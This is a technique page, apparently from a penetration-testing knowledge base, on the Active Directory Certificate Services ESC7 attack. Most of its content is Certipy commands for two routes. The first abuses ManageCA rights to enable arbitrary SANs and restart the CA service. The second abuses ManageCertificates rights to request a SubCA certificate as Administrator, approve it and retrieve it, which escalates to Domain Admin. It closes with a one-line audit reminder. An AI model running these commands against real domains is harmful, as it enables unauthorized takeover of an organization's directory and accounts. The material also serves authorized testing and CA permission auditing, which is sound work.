---
title: 'ESC7: Vulnerable CA Access Control'
description: 'ESC7: Vulnerable CA Access Control.'
---
# ESC7: Vulnerable CA Access Control

ESC7 is the digital equivalent of finding the keys to the CA server lying on the receptionist's desk.

This attack occurs when a low-privileged user is granted `ManageCA` or `ManageCertificates` rights on the Certificate Authority object itself. With these rights, you don't need to find a vulnerable template—you have the authority to *make* the CA do whatever you want.

## The Attack Path (ManageCA)

If you hold the `ManageCA` right, you can simply toggle the `EDITF_ATTRIBUTESUBJECTALTNAME2` registry key on the CA, wait for the service to restart, and then exploit ESC6.

### 1. Enable the Global SAN Override
Using Certipy, you can modify the CA configuration to allow arbitrary SANs.
```bash
certipy ca -u 'john' -p 'Passw0rd!' -d 'domain.local' -dc-ip 192.168.100.1 -ca 'domain-CA' -enable-san
```

### 2. Restart the CA Service
Wait, you can't restart the service without admin rights on the server, right? Wrong! If you have `ManageCA` rights, you can remotely restart the CertSvc.
```bash
certipy ca -u 'john' -p 'Passw0rd!' -d 'domain.local' -dc-ip 192.168.100.1 -ca 'domain-CA' -restart
```

### 3. Exploit ESC6
Now that the CA accepts SANs globally, find any Client Authentication template, request a certificate as the Domain Admin, and retrieve your TGT. Don't forget to disable the SAN override when you're done!

---

## The Attack Path (ManageCertificates)

If you hold the `ManageCertificates` right (also known as the "Issue and Manage Certificates" right), your path is slightly different. You can't change the global CA config, but you *can* approve pending certificate requests.

### 1. Submit a Failed Request
Find a template like `SubCA` (which usually requires manager approval). Request a certificate and inject a Domain Admin SAN.
```bash
certipy req -u 'john' -p 'Passw0rd!' -d 'domain.local' -ca 'domain-CA' -template 'SubCA' -upn 'Administrator@domain.local'
```
*The CA will reply with: "Request is pending approval." It will also give you a Request ID (e.g., 1337).*

### 2. Approve Your Own Request
Since you have `ManageCertificates` rights, you are the manager! Approve your own request.
```bash
certipy ca -u 'john' -p 'Passw0rd!' -d 'domain.local' -ca 'domain-CA' -issue-request 1337
```

### 3. Retrieve the Certificate
Fetch the approved certificate from the CA.
```bash
certipy req -u 'john' -p 'Passw0rd!' -d 'domain.local' -ca 'domain-CA' -retrieve 1337
```

!!! important
    Having rights over the CA object is incredibly powerful. Always audit your CA security descriptors!
